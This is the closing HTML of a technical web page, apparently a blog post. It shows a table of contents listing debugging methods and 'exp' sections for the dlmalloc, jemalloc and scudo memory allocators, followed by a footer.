                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#diao-shi-fang-fa">调试方法</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#dlmalloc">dlmalloc</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#jemalloc">jemalloc</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#scudo">scudo</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="/script.js"></script>
</body>
</html>